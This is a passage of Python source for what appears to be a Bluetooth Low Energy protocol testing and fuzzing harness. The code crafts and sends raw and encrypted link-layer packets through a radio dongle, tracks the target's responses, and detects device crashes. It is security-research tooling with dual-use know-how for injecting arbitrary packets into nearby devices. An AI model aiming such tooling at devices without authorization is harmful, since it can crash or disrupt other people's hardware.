            self.master_address_type = ble_roles.PUBLIC_DEVICE_ADDRESS
        else:
            self.master_address_raw = os.urandom(6)
            self.master_address_type = ble_roles.RANDOM_DEVICE_ADDRESS

        self.peer_address = ''.join(self.slave_address.split(':'))
        self.slave_address_raw = ''.join(map(lambda x: chr(int(x, 16)), self.slave_address.split(':')))

        self.smp.initiate_security_manager_for_connection(self.peer_address,
                                                          ble_roles.PUBLIC_DEVICE_ADDRESS,
                                                          self.master_address_raw, self.master_address_type,
                                                          ble_roles.ROLE_TYPE_CENTRAL)

        SetFuzzerConfig(states_fuzzer_config)

        self.machine = GreyhoundStateMachine(states=machine_states,
                                             transitions=machine_transitions,
                                             print_transitions=True,
                                             print_timeout=True,
                                             initial='SCANNING',
                                             idle_state='SCANNING',
                                             before_state_change='state_change',
                                             show_conditions=True,
                                             show_state_attributes=False,
                                             enable_webserver=True)

        # Start serial monitor to detect crashes if available
        self.monitor = Monitor(self.monitor_serial_port, self.monitor_serial_baud,
                               magic_string=self.monitor_serial_magic_string,
                               user_callback=self.scan_timeout_detected)

    # Configuration functions
    # def get_config(self):
    #     obj = {'MasterAddress': self.master_address.upper(),
    #            'SlaveAddress': self.slave_address.upper(),
    #            'AccessAdress': hex(self.conn_access_address).split('0x')[1].upper(),
    #            'ConnectionInterval': self.conn_interval,
    #            'WindowOffset': self.conn_window_offset,
    #            'WindowSize': self.conn_window_size,
    #            'SlaveLatency': self.conn_slave_latency,
    #            'ChannelMap': hex(self.conn_channel_map).split('0x')[1].upper(),
    #            'ConnectionTimeout': self.conn_timeout,
    #            'MasterFeatureSet': self.master_feature_set,
    #            'DongleSerialPort': self.dongle_serial_port,
    #            'EnableFuzzing': self.enable_fuzzing,
    #            'EnableDuplication': self.enable_duplication,
    #            'PairingPin': self.pairing_pin,
    #            'MonitorSerialPort': self.monitor_serial_port,
    #            'MonitorSerialBaud': self.monitor_serial_baud
    #            }
    #     return json.dumps(obj, indent=4)

    def set_master_addr(self, new_master_addr):
        self.master_address = new_master_addr.lower()
        self.master_address_raw = ''.join(map(lambda x: chr(int(x, 16)), self.master_address.split(':')))

    def set_slave_addr(self, new_slave_addr):
        self.slave_address = new_slave_addr.lower()
        self.peer_address = ''.join(self.slave_address.split(':'))
        self.slave_address_raw = ''.join(map(lambda x: chr(int(x, 16)), self.slave_address.split(':')))

    def adjust_slave_addr(self, new_slave_addr):
        self.set_slave_addr(new_slave_addr)

        # reinitiate variables dependent on slave address
        self.smp = SecurityManagerProtocol(self)
        self.att = AttributeProtocol(self, self.smp, event_hook=None, gatt_server=self.master_gatt_server, mtu=self.master_mtu)
        self.smp.initiate_security_manager_for_connection(self.peer_address, 
                                                        ble_roles.PUBLIC_DEVICE_ADDRESS, 
                                                        self.master_address_raw, self.master_address_type,
                                                        ble_roles.ROLE_TYPE_CENTRAL)
    
    def load_addr_type(self):
        f = open(self.addr_file, 'r')
        obj = json.loads(f.read())
        f.close()
        
        self.master_address_type = obj['MasterAddressType']
        self.slave_address_type = obj['SlaveAddressType']

    def load_initial_addrs(self):
        f = open(self.addr_file, 'r')
        obj = json.loads(f.read())
        f.close()

        self.set_master_addr(obj['MasterAddress'])
        self.set_slave_addr(obj['SlaveAddress'])
        self.master_address_type = obj['MasterAddressType']
        self.slave_address_type = obj['SlaveAddressType']



    def set_config(self, data):
        #self.conn_access_address = int(data['AccessAdress'], 16)
        self.conn_interval = int(data['ConnectionInterval'])
        self.conn_window_offset = int(data['WindowOffset'])
        self.conn_window_size = int(data['WindowSize'])
        self.conn_slave_latency = int(data['SlaveLatency'])
        #self.conn_channel_map = int(data['ChannelMap'], 16)
        self.conn_timeout = int(data['ConnectionTimeout'])
        self.master_feature_set = data['MasterFeatureSet']
        self.dongle_serial_port = data['DongleSerialPort']
        self.enable_fuzzing = bool(data['EnableFuzzing'])
        self.enable_duplication = bool(data['EnableDuplication'])
        self.pairing_pin = data['PairingPin']
        self.monitor_serial_port = data['MonitorSerialPort']
        self.monitor_serial_baud = int(data['MonitorSerialBaud'])

    # def save_config(self, obj):
    #     if self.config_file:
    #         f = open(self.config_file, 'w')
    #         f.write(json.dumps(obj, indent=4))
    #         f.close()

    def load_config(self):
        f = open(self.config_file, 'r')
        obj = json.loads(f.read())
        f.close()

        self.set_config(obj)
        
        return True

        # try:
        #     f = open(self.config_file, 'r')
        #     obj = json.loads(f.read())
        #     f.close()
        #     self.set_config(obj)
        #     self.load
        #     return True
        # except:
        #     f = open(self.config_file, 'w')
        #     f.write(self.get_config())
        #     f.close()
        #     return False


    # -------------------------------------------
    def state_change(self):
        if self.machine.source != self.machine.destination:
            self.update_timeout('conn_general_timer')
        self.empty_pdu_count = 0

    @staticmethod
    def create_gatt_server(mtu=23):
        gatt_server = Server(None)
        gatt_server.set_mtu(mtu)

        # Add Generic Access Service (https://www.bluetooth.com/specifications/gatt/services/)
        service_1 = gatt_server.generate_primary_gatt_service(PyBTGATT.UUID("1800"))
        # Add service to server
        gatt_server.add_service(service_1)
        # generate Device Name characteristic in service_1
        char1 = service_1.generate_and_add_characteristic('Greyhound',
                                                          PyBTGATT.GATT_PROP_READ | PyBTGATT.GATT_PROP_WRITE,
                                                          PyBTGATT.UUID("2A00"),
                                                          PyBTGATT.ATT_PROP_READ | PyBTGATT.ATT_PROP_WRITE,
                                                          PyBTGATT.ATT_SECURITY_MODE_OPEN,
                                                          PyBTGATT.ATT_SECURITY_MODE_NO_ACCESS, False)
        char1.generate_and_add_user_description_descriptor("Device Name")

        char1 = service_1.generate_and_add_characteristic('\x00\x00',
                                                          PyBTGATT.GATT_PROP_READ | PyBTGATT.GATT_PROP_WRITE,
                                                          PyBTGATT.UUID("2A01"),
                                                          PyBTGATT.ATT_PROP_READ | PyBTGATT.ATT_PROP_WRITE,
                                                          PyBTGATT.ATT_SECURITY_MODE_OPEN,
                                                          PyBTGATT.ATT_SECURITY_MODE_NO_ACCESS, False)
        char1.generate_and_add_user_description_descriptor("Appearance")

        char1 = service_1.generate_and_add_characteristic('\xFF\xFF\xFF\xFF\x00\x00\xFF\xFF',
                                                          PyBTGATT.GATT_PROP_READ | PyBTGATT.GATT_PROP_WRITE,
                                                          PyBTGATT.UUID("2A04"),
                                                          PyBTGATT.ATT_PROP_READ | PyBTGATT.ATT_PROP_WRITE,
                                                          PyBTGATT.ATT_SECURITY_MODE_OPEN,
                                                          PyBTGATT.ATT_SECURITY_MODE_NO_ACCESS, False)
        char1.generate_and_add_user_description_descriptor("Conn Paramaters")
        # -----

        # Add Immediate Alert Service (https://www.bluetooth.com/specifications/gatt/services/)
        service_1 = gatt_server.generate_primary_gatt_service(PyBTGATT.UUID("1802"))
        # Add service to server
        gatt_server.add_service(service_1)
        # generate Alert Level characteristic in service_1
        char1 = service_1.generate_and_add_characteristic('\x00',
                                                          PyBTGATT.GATT_PROP_READ | PyBTGATT.GATT_PROP_WRITE,
                                                          PyBTGATT.UUID("2A06"),
                                                          PyBTGATT.ATT_PROP_READ | PyBTGATT.ATT_PROP_WRITE,
                                                          PyBTGATT.ATT_SECURITY_MODE_OPEN,
                                                          PyBTGATT.ATT_SECURITY_MODE_NO_ACCESS, False)
        # add user description descriptor to characteristic
        char1.generate_and_add_user_description_descriptor("Characteristic 1")
        gatt_server.refresh_database()
        # gatt_server.debug_print_db()
        return gatt_server

    def save_ble_device(self):
        export_dict = self.slave_device.export_device_to_dictionary()
        device_json_output = json.dumps(export_dict, indent=4)
        f = open("bluetooth/device.json", "w")
        f.write(device_json_output)
        f.close()

    def update_slave_handles(self):
        if self.slave_handles:
            del self.slave_handles
        self.slave_handles = []

        if self.slave_handles_values:
            del self.slave_handles_values
        self.slave_handles_values = {}

        self.slave_handles_idx = 0
        for service in self.slave_device.services:
            self.slave_handles.append(service.start)
            for characteristic in service.characteristics:
                self.slave_handles.append(characteristic.handle)
                for descriptor in characteristic.descriptors:
                    self.slave_handles.append(descriptor.handle)

    @staticmethod
    def bt_crypto_e(key, plaintext):
        aes = AES.new(key, AES.MODE_ECB)
        return aes.encrypt(plaintext)

    def send(self, pkt):
        global command
        # if (self.slave_connected == False and BTLE_DATA in pkt):
        #    print(Fore.YELLOW + '[!] Skipping packets TX')
        #    return

        # if self.enable_fuzzing:
        #    fuzzing.fuzz_packet_by_layers(pkt, self.state, states_fuzzer_config, self)

        # if self.enable_duplication and (BTLE_DATA in pkt) and (LL_TERMINATE_IND not in pkt):
        #    fuzzing.repeat_packet(self)

        # if self.driver == None:
        #    return

        # if self.slave_crashed == False:
        #    self.machine.add_packets(
        #        NORDIC_BLE(board=75, protocol=2, flags=0x3, event_counter=self.driver.event_counter)
        #        / pkt)  # CRC ans master -> slave direction
        # self.sent_packet = pkt

        if pkt is None:
            return

        print(Fore.CYAN + "TX ---> " + pkt.summary()[7:])
        pkt.show()
        print("command: "+command)
        # pkt[BTLE].len = 0x72
        if "enc_pause_resp" in command:
            self.conn_encryted = False
        if self.conn_encryted is False or "discon_req" in command or "con_req" in command:
            # print(Fore.CYAN + "TX ---> " + pkt.summary()[7:])
            self.driver.raw_send(raw(pkt))
            # try:
            #     self.driver.raw_send(raw(pkt))
            # except:
            #     print(Fore.RED + "Fuzzing problem")
        else:
            self.send_encrypted(pkt)

    def send_encrypted(self, pkt):
        try:
            raw_pkt = bytearray(raw(pkt))
            access_address = raw_pkt[:4]
            header = raw_pkt[4]  # Get ble header
            length = raw_pkt[5] + 4  # add 4 bytes for the mic
            crc = '\x00\x00\x00'

            pkt_count = bytearray(struct.pack("<Q", self.conn_master_packet_counter)[:5])  # convert only 5 bytes
            pkt_count[4] |= 0x80  # Set for master -> slave
            if self.conn_iv is None or self.conn_session_key is None:
                return
            nonce = pkt_count + self.conn_iv

            aes = AES.new(self.conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic

            aes.update(chr(header & 0xE3))  # Calculate mic over header cleared of NES, SN and MD

            enc_pkt, mic = aes.encrypt_and_digest(raw_pkt[6:-3])  # get payload and exclude 3 bytes of crc
            print("$$$$$$$$$$$$$$$$$$$$$$$")
            print("sending encrypted stuffffff!!!!!")
            self.driver.raw_send(access_address + chr(header) + chr(length) + enc_pkt + mic + crc)
            self.conn_master_packet_counter += 1
        except:
            print ("Can not send!")

    def receive_encrypted(self, pkt):
        raw_pkt = bytearray(raw(pkt))
        access_address = raw_pkt[:4]
        header = raw_pkt[4]  # Get ble header
        length = raw_pkt[5]  # add 4 bytes for the mic

        if length is 0 or length < 5:
            # ignore empty PDUs
            return pkt
        # Subtract packet length 4 bytes of MIC
        length -= 4

        # Update nonce before decrypting
        pkt_count = bytearray(struct.pack("<Q", self.conn_slave_packet_counter)[:5])  # convert only 5 bytes
        pkt_count[4] &= 0x7F  # Clear bit 7 for slave -> master
        if self.conn_session_key is None or self.conn_iv is None or pkt is None:
            return

        nonce = pkt_count + self.conn_iv


        aes = AES.new(self.conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic
        aes.update(chr(header & 0xE3))  # Calculate mic over header cleared of NES, SN and MD

        dec_pkt = aes.decrypt(raw_pkt[6:-4 - 3])  # get payload and exclude 3 bytes of crc

        try:
            mic = raw_pkt[6 + length: -3]  # Get mic from payload and exclude crc
            aes.verify(mic)
            self.conn_slave_packet_counter += 1
            return BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
        except:
            print(Fore.RED + "MIC Wrong")
            self.conn_slave_packet_counter += 1
            p = BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
            # self.machine.report_anomaly(msg='MIC Wrong', pkt=p)
            return None

    # Ble Suite bypass functions
    ff = 0

    def raw_att(self, attr_data, conn_handle, length):
        if self.driver:
            pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / attr_data


            self.send(pkt)
            # self.send(pkt)
            # self.send(pkt)
            # self.send(pkt)
            # self.send(pkt)


            # self.send(pkt)
            # if ATT_Read_By_Type_Request in pkt:
            #     self.send(pkt)

    def raw_smp(self, smp_data, conn_handle, length):
        if self.driver:
            pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / smp_data
            self.send(pkt)

    def reset_dongle_connection(self):
        self.driver.reset()
        
    def reset_vars(self):
        global scan_response_received
        global saved_ATT_Hdr
        global saved_pkt_with_ATT_Hdr
        scan_response_received = False
        self.slave_l2cap_fragment = []
        self.empty_pdu_count = 0
        saved_ATT_Hdr = None
        saved_pkt_with_ATT_Hdr = None
        self.conn_encryted = False
        self.sent_packet = None
        self.conn_master_packet_counter = 0
        self.conn_slave_packet_counter = 0
        self.slave_next_start_handle = None
        self.slave_next_end_handle = None
        self.slave_service_idx = None
        self.slave_characteristic_idx = None
        self.slave_characteristic = None
        self.pairing_starting = False
        self.slave_connected = False
        self.slave_crashed = False
        self.iteration()
        self.name = 'BLE'
        self.iterations = 0
        # Default Model paramaters
        #self.master_feature_set = 'le_encryption+le_data_len_ext'  # Model dependent
        self.master_mtu = 247  # TODO: master_mtu
        #self.conn_access_address = 0x5a328372
        self.conn_interval = 16
        self.conn_window_offset = 1
        self.conn_window_size = 2
        #self.conn_channel_map = 0x1FFFFFFFFF
        self.conn_slave_latency = 0
        self.conn_timeout = 100
        self. dongle_serial_port = '/dev/ttyACM0'
        self.enable_fuzzing = False
        self.enable_duplication = False
        self. pairing_pin = '0000'
        self.scan_timeout = 6  # Time in seconds for detect a crash during scanning
        self.state_timeout = 3  # state timeout
        #self.pairing_iocap = 0x01  # DisplayYesNo
        #self.pairing_iocap = 0x03  # NoInputNoOutput
        # pairing_iocap = 0x04  # KeyboardDisplay
        # paring_auth_request = 0x00  # No bonding
        # paring_auth_request = 0x01  # Bonding
        #self.paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
        # paring_auth_request = 0x04 | 0x01  # MITM + bonding
        # paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bonding
        # monitor_serial_port = '/dev/ttyUSB0'      # taking input from ble_config.json file
        self.monitor_serial_baud = 115200
        self.monitor_serial_magic_string = 'BLE Host Task Started'
        # -----------------------------------------------------------------------------------
        self.monitor = None
        # Timers for name reference
        self.conn_supervision_timer = None  # type: threading.Timer
        self.conn_general_timer = None  # type: threading.Timer
        self.scan_timeout_timer = None  # type: threading.Timer
        # Internal instances
        # Internal variables

        self.pkt_received = None
        self.pkt = None
        self.peer_address = None
        self.last_gatt_request = None
        self.empty_pdu_count = 0
        self.master_gatt_server = None
        self.sent_packet = None
        self.pairing_starting = False
        # Internal Slave params
        self.slave_address_type = None
        self.slave_feature_set = None
        self.slave_ble_version = None
        self.slave_next_start_handle = None
        self.slave_next_end_handle = None
        self.slave_service_idx = None
        self.slave_characteristic_idx = None
        self.slave_characteristic = None
        self.slave_device = None  # type: BLEDevice
        #self.slave_handles = None
        #self.slave_handles_values = None
        #self.slave_handles_idx = None
        self.slave_ever_connected = False
        self.slave_connected = False
        self.slave_crashed = False
        self.slave_l2cap_fragment = []
        # Internal Encryption params
        self.conn_ltk = None
        self.conn_ediv = None
        self.conn_rand = None
        self.conn_iv = None
        self.conn_skd = None
        self.conn_session_key = None  # Used for LL Encryption
        self.conn_master_packet_counter = 0  # Packets counter for master (outgoing)
        self.conn_slave_packet_counter = 0  # Packets counter for slave (incoming)
        self.conn_encryted = False
        print("self.master_address: " + str(self.master_address))
        self.master_address = str(RandMAC()).upper()
        print("self.master_address: " + str(self.master_address))
        self.master_address_raw = ''.join(map(lambda x: chr(int(x, 16)), self.master_address.split(':')))
        '''
        self.master_address_raw = os.urandom(6)
        self.master_address_type = ble_roles.RANDOM_DEVICE_ADDRESS

        self.peer_address = ''.join(self.slave_address.split(':'))
        self.slave_address_raw = ''.join(map(lambda x: chr(int(x, 16)), self.slave_address.split(':')))
        print("self.peer_address: "+ self.peer_address)
        print("ble_roles.PUBLIC_DEVICE_ADDRESS: " + str(ble_roles.PUBLIC_DEVICE_ADDRESS))
        print("self.master_address_raw: " + self.master_address_raw)
        print("self.self.master_address_type: " + str(self.master_address_type))
        self.smp.initiate_security_manager_for_connection(self.peer_address,
                                                          ble_roles.PUBLIC_DEVICE_ADDRESS,
                                                          self.master_address_raw, self.master_address_type,
                                                          ble_roles.ROLE_TYPE_CENTRAL)
        '''

    def timeout_detected(self):
        # self.machine.reset_state_timeout()
        self.disable_timeout('conn_supervision_timer')
        self.disable_timeout('conn_general_timer')
        # self.start_timeout('scan_timeout_timer', self.scan_timeout, self.scan_timeout_detected)
        print(Fore.LIGHTRED_EX + '[TIMEOUT] !!! Link timeout detected !!!')
        # print(Fore.YELLOW + 'Reseting model to state ' + self.machine.idle_state)
        # self.machine.reset_machine()
        # self.reset_vars()
        # self.machine.save_packets()

    def timeout_transition_detected(self):
        self.machine.reset_state_timeout()
        self.disable_timeout('conn_supervision_timer')
        self.disable_timeout('conn_general_timer')
        self.start_timeout('scan_timeout_timer', self.scan_timeout, self.scan_timeout_detected)
        print(Fore.YELLOW + '[TIMEOUT] !!! State global timeout !!!')
        print(Fore.YELLOW + 'Reseting model to state ' + self.machine.idle_state)
        self.machine.reset_machine()
        self.reset_vars()
        self.machine.save_packets()

    def scan_timeout_detected(self):
        if self.slave_ever_connected:
            self.disable_timeout('conn_general_timer')
            self.machine.report_crash()
            self.slave_ever_connected = False
            self.reset_vars()
            self.machine.save_packets()
            self.slave_crashed = True

    def disable_timeout(self, timer_name):
        timer = getattr(self, timer_name)
        if timer:
            timer.cancel()
            setattr(self, timer_name, None)

    def update_timeout(self, timer_name):
        timer = getattr(self, timer_name)
        if timer:
            timer.cancel()
            self.start_timeout(timer_name, timer.interval, timer.function)

    def start_timeout(self, timer_name, seconds, callback):
        timer = getattr(self, timer_name)
        timer = threading.Timer(seconds, callback)
        setattr(self, timer_name, timer)
        timer.daemon = True
        timer.start()

    def announce_connection(self):
        self.disable_timeout('scan_timeout_timer')
        # self.start_timeout('conn_supervision_timer', self.conn_timeout / 100.0, self.timeout_detected)
        # self.start_timeout('conn_general_timer', self.state_timeout, self.timeout_transition_detected)
        print(Fore.GREEN + '[!] BLE Connection Established to target device')
        print(Fore.GREEN + '[!] Supervision timeout set to ' + str(self.conn_timeout / 100.0) + ' seconds')
        self.slave_ever_connected = True  # used to detect first connection
        self.slave_connected = True  # used to detect first connection

    def announce_disconnection(self):
        self.disable_timeout('conn_supervision_timer')
        self.disable_timeout('conn_general_timer')
        # self.start_timeout('scan_timeout_timer', self.scan_timeout, self.scan_timeout_detected)
        self.machine.save_packets()
        self.reset_vars()
        print(Fore.YELLOW + '[!] Disconnected from target device')

    def iteration(self):

        fitness.Transition(reset=True)
        state_transitions = fitness.TransitionLastCount
        iterationTime = fitness.Iteration()

        if fitness.IssuePeriod > 0:
            issuePeriod = fitness.IssuePeriod
        else:
            issuePeriod = float('inf')

        print(Back.WHITE + Fore.BLACK +
              "IssueCount:" + str(fitness.IssueCounter) + ' IssuePeriod:{0:.3f}'.format(issuePeriod)
              + ' Transitions:' + str(state_transitions) + ' IterTime:{0:.3f}'.format(
            iterationTime) + ' TotalIssues: '
              + str(fitness.IssuesTotalCounter))

        send_fitness(fitness.IssueCounter, issuePeriod, state_transitions, iterationTime, self.iterations,
                     fitness.IssuesTotalCounter)

        self.iterations += 1

    # Receive functions
    def sniff(self, timeout = 2):


        # self.retry()
        # timeout variable can be omitted, if you use specific value in the while condition
        # timeout = 2  # [seconds]
        print(Fore.YELLOW + '[!] BLE Sniffing started... ')
        timeout_start = time.time()
        out = 0
        while time.time() < timeout_start + timeout:
            try:
                if self.driver:

                    while time.time() < timeout_start + timeout:
                        data = self.driver.raw_receive()
                        if data:
                            pkt = BTLE(data)
                            out = self.receive_packet(pkt)
                            #print("value of out is: "+str(out))
                            #if out == 1:
                             #break
                    #if out == 1:
                     #break


            except KeyboardInterrupt:
                print(Fore.RED + 'Model process stopped' + Fore.RESET)
                exit(0)
            except SerialException:
                self.driver = None
                print(Fore.RED + 'Serial busy' + Fore.RESET)

            '''
            try:
                print(Fore.RED + 'Recovering' + Fore.RESET)
                self.disable_timeout('scan_timeout_timer')
                sleep(2)  # Sleep 1 second and retry
                self.driver = NRF52Dongle(self.dongle_serial_port, 1000000)
            except KeyboardInterrupt:
                print(Fore.RED + 'Model process stopped' + Fore.RESET)
                exit(0)
            except SerialException:
                pass
            '''

    def receive_packet(self, pkt):
        # self.update_timeout('conn_supervision_timer')
        global scan_response_received
        global saved_ATT_Hdr
        global saved_pkt_with_ATT_Hdr
        global command
        print_lines = False
        append_current_pkt = True
        pkts_to_process = []

        # Decrypt packet if link is encrypted

        if self.conn_encryted:
            pkt = self.receive_encrypted(pkt)
            if pkt is None:
                # Integrity check fail. Drop packet to not cause validation confusion
                return

        # Add packet to session packets history
        if self.slave_crashed == False:
            self.machine.add_packets(
                NORDIC_BLE(board=75, protocol=2, flags=0x01, event_counter=self.driver.event_counter) / pkt)
        # Handle L2CAP fragment
        if (BTLE_DATA in pkt and pkt.len != 0) and (pkt.LLID == 0x02 or pkt.LLID == 0x01):
            if pkt.LLID == 0x01 or len(self.slave_l2cap_fragment) == 0:
                self.slave_l2cap_fragment.append(pkt)
                return
            append_current_pkt = False
            self.slave_l2cap_fragment.append(pkt)

        if len(self.slave_l2cap_fragment) > 0:
            p_full = raw(self.slave_l2cap_fragment[0])[:-3]  # Get first raw l2cap start frame
            self.slave_l2cap_fragment.pop(0)  # remove it from list
            idx = 0
            for frag in self.slave_l2cap_fragment:
                if frag.LLID == 0x02:
                    break
                p_full += raw(frag[BTLE_DATA].payload)  # Get fragment bytes
                idx += 1
                # print(Fore.YELLOW + 'fragment')

            del self.slave_l2cap_fragment[:idx]
            p = BTLE(p_full + '\x00\x00\x00')
            p.len = len(p[BTLE_DATA].payload)  # update ble header length
            pkts_to_process.append(p)  # joins all fragements

        # Add currently received packet
        if append_current_pkt:
            pkts_to_process.append(pkt)

        # Process packts in the packet list
        for pkt in pkts_to_process:
            # If packet is not an empty pdu or a termination indication
            if Raw in pkt:
                continue
            if (BTLE_EMPTY_PDU not in pkt) and (LL_TERMINATE_IND not in pkt) and (
                    L2CAP_Connection_Parameter_Update_Request not in pkt) and (
                    BTLE_DATA in pkt or (
                    (BTLE_ADV_IND in pkt or BTLE_SCAN_RSP in pkt) and pkt.AdvA == self.slave_address)):
                # Print packet and state
                print(Fore.BLUE + "State:" + Fore.LIGHTCYAN_EX + self.state + Fore.LIGHTCYAN_EX)
                print(Fore.CYAN + "RX <--- " + pkt.summary())
                # pkt.show()
                # packet = pkt.summary()[7:]
                print_lines = True
                # Validate received packet against state
                # if fitness.Validate(pkt, self.state, states_fuzzer_config) == False:
                # self.machine.report_anomaly(pkt=pkt)

                self.pkt_received = True
                self.pkt = pkt
                self.update()
                if ATT_Hdr in pkt:
                    saved_ATT_Hdr = ATT_Hdr
                    saved_pkt_with_ATT_Hdr = pkt
                if LL_TERMINATE_IND in pkt:
                    print(Fore.YELLOW + "[!] LL_TERMINATE_IND received. Disconnecting from the slave...")
                    self.disable_timeout('conn_supervision_timer')
                    self.disable_timeout('conn_general_timer')
                    self.reset_vars()
                    self.machine.save_packets()
                    self.machine.reset_machine()
                if "BTLE_ADV / BTLE_ADV_IND" in pkt.summary():
                    print("Received advertising indications")
                    if "steval" in device:
                        self.client_socket.send("adv_ind\n")
                if "BTLE_ADV / BTLE_SCAN_RSP" in pkt.summary():
                    print("Received scan response")
                    self.client_socket.send("scan_resp\n")
                    self.receive_scan_response()
                    scan_response_received = True

                if "BTLE_DATA / CtrlPDU / LL_SLAVE_FEATURE_REQ" in pkt.summary():
                    print("Received feature request")
                    self.client_socket.send("feature_req\n")
                    self.receive_feature_request()
                    self.send_feature_response()
                        #return 1
                if "BTLE_DATA / CtrlPDU / LL_LENGTH_REQ" in pkt.summary():
                    print("Received length request")
                    #self.client_socket.send("length_req\n")
                    self.receive_length_request()
                    self.send_length_response()
                if "BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Exchange_MTU_Request" in pkt.summary():
                    print("Received MTU request")
                    self.client_socket.send("mtu_req\n")
                    self.receive_mtu_length_request()
                    self.send_mtu_length_response()

                if "BTLE_DATA / CtrlPDU / LL_LENGTH_RSP" in pkt.summary():
                    print("Received length response")
                    self.client_socket.send("length_resp\n")
                    self.receive_length_response()

                if "BTLE / BTLE_DATA / CtrlPDU / LL_REJECT_IND" in pkt.summary():
                    print("received LL reject\n")
                    self.client_socket.send("ll_reject\n")

                if "BTLE / BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Read_By_Group_Type_Request" in pkt.summary():
                    print("Recieved PRI Request from OTA")
                    #self.client_socket.send("pri_req\n")
                    self.send_pri_services_response()
                    # self.receive_pri_services()     #TODO: check

                if "BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Read_By_Type_Request" in pkt.summary():
                    print("Received read type request")
                    #self.client_socket.send("char_req\n")
                if "BTLE / BTLE_DATA / CtrlPDU / LL_VERSION_IND" in pkt.summary():
                    print("Received version response from OTA")
                    self.client_socket.send("version_resp\n")
                    self.receive_version_indication()
                    if "version_req" not in command:
                        self.send_version_indication()

                if "BTLE / BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Exchange_MTU_Response" in pkt.summary():
                    print("Received mtu_resp from OTA")
                    pkt.show()
                    self.client_socket.send("mtu_resp\n")
                    self.receive_mtu_length_response()
                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Pairing_Response" in pkt.summary():
                    print("Received Pairing Response from OTA")
                    auth_value = pkt[SM_Pairing_Response].authentication
                    auth_value = auth_value & 0b0010
                    #print(type(auth_value))
                    print(auth_value)
                    print(type(auth_value))
                    if "pair_req_no_sc" in command:
                        print("sending pair_resp_no_sc")
                        self.client_socket.send("pair_resp_no_sc\n")
                    else:
                        print("sending pair_resp")
                        self.client_socket.send("pair_resp\n")
                    self.finish_pair_response()

                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Public_Key" in pkt.summary():
                    print("Received public_key_response from OTA")

                    self.pkt.show()
                    self.finish_key_exchange()
                    self.client_socket.send("public_key_response\n")

                if "BTLE_DATA / CtrlPDU / LL_FEATURE_RSP" in pkt.summary():
                    print("Received feature response")
                    self.client_socket.send("feature_resp\n")
                    self.receive_feature_response()

                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Confirm" in pkt.summary():
                    print("Received sm_confirm from OTA")
                    self.client_socket.send("sm_confirm\n")
                    self.finish_pair_response()

                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Random" in pkt.summary():
                    print("Received sm_random_received from OTA")

                    self.finish_pair_response()
                    self.client_socket.send("sm_random_received\n")

                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_DHKey_Check" in pkt.summary():
                    print("Received dh_key_response from OTA")
                    self.finish_pair_response()
                    self.client_socket.send("dh_key_response\n")

                if "BTLE / BTLE_DATA / CtrlPDU / LL_ENC_RSP" in pkt.summary():
                    print("Recieved Encryption Response from OTA")
                    self.client_socket.send("enc_resp\n")
                    self.receive_encryption_response()
                if "BTLE / BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Read_By_Group_Type_Response" in pkt.summary():
                    print("Recieved pri_resp from OTA")
                    self.client_socket.send("pri_resp\n")
                    self.receive_pri_services()
                if "BTLE / BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Read_By_Type_Response" in pkt.summary():
                    print("received char_resp from OTA")
                    print("command: "+str(command))
                    self.client_socket.send("char_resp\n")
                    if "char_req" in command:
                        self.receive_characteristics()
                    else:
                        self.receive_includes()
                    #self.receive_descriptors()
                if "BTLE / BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Error_Response" in pkt.summary():
                    print("received att_error")
                    self.client_socket.send("att_error\n")
                if "BTLE / BTLE_DATA / CtrlPDU / LL_START_ENC_REQ" in pkt.summary():
                    print("Recieved Start Encryption Request from OTA")
                    self.client_socket.send("start_enc_req\n")
                    self.receive_encryption_response()
                if "BTLE / BTLE_DATA / CtrlPDU / LL_START_ENC_RSP" in pkt.summary():
                    print("Recieved Start Encryption Response from OTA")
                    self.client_socket.send("start_enc_resp\n")
                    self.receive_encryption_response()
                    # self.send_sec_services_request()
                if "BTLE / BTLE_DATA / CtrlPDU / LL_PAUSE_ENC_RSP" in pkt.summary():
                    print("Recieved Encryption Pause Response from OTA")
                    self.client_socket.send("enc_pause_resp\n")
                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Signing_Information" in pkt.summary():
                    self.pkt.show()
                    print("Recieved SM_Signing_Information from OTA")
                    self.finish_keys()

                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Identity_Information" in pkt.summary():
                    self.pkt.show()
                    print("Recieved SM_Signing_Information from OTA")
                    self.finish_keys()

                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Identity_Address_Information" in pkt.summary():
                    self.pkt.show()
                    print("Recieved SM_Signing_Information from OTA")
                    self.finish_keys()


                if "BTLE / BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Find_Information_Response" in pkt.summary():
                    print("received desc_resp from OTA")
                    self.client_socket.send("desc_resp\n")
                    self.receive_descriptors()
                if "BTLE / BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Read_Response" in pkt.summary():
                    print("received read response")
                    self.client_socket.send("read_resp\n")
                    self.finish_readings()
                if "BTLE / BTLE_DATA / L2CAP_Hdr / ATT_Hdr / ATT_Write_Response" in pkt.summary():
                    print("received write response")
                    self.client_socket.send("write_resp\n")
                    self.finish_writing()
